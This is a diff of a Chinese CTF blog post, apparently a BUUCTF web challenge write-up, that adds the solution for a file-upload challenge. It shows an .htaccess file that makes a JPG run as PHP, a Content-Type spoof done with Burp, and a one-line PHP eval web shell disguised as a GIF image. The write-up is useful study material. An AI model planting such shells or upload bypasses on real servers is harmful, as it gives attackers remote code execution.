@@ -33,7 +33,7 @@
                             "url": "https:\/\/1iu2y.github.io\/posts\/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4\/featured-image.png",
                             "width":  1975 ,
                             "height":  910 
-                        }],"genre": "posts","keywords": "CTF, web","wordcount":  117 ,
+                        }],"genre": "posts","keywords": "CTF, web","wordcount":  311 ,
         "url": "https:\/\/1iu2y.github.io\/posts\/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4\/","datePublished": "2021-08-24T19:10:31+08:00","dateModified": "2021-08-24T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -110,7 +110,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF Web记录 4</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-24">2021-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 117 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-24">2021-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 311 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
@@ -143,7 +143,36 @@
             alt="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210824192847310.png" />
     </a><figcaption class="image-caption">笑川の笑容</figcaption>
     </figure></p>
-<p>试了一下，php/php2/php3/phtml什么的都传不了，jpg可以传</p></div><div class="post-footer" id="post-footer">
+<p>试了一下，php/php2/php3/phtml什么的都传不了，jpg可以传</p>
+<p>那么思路就比较明显了，又是上传<code>.htaccess</code>或者<code>.user.ini</code>文件来使得服务端将图片🐎当作php文件解析。</p>
+<p>上传<code>.htaccess</code>文件，文件内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">GIF89a
+&lt;FilesMatch &#34;leo.jpg&#34;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>这一步需要用Burp拦截请求，手动修改<code>Content-Type: application/octet-stream</code>为<code>Content-Type: image/png</code>。</p>
+<p>然后上传<code>leo.jpg</code>，其中写入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span>
+<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s1">&#39;php&#39;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ye&#39;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>蚁剑连接即可。</p></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
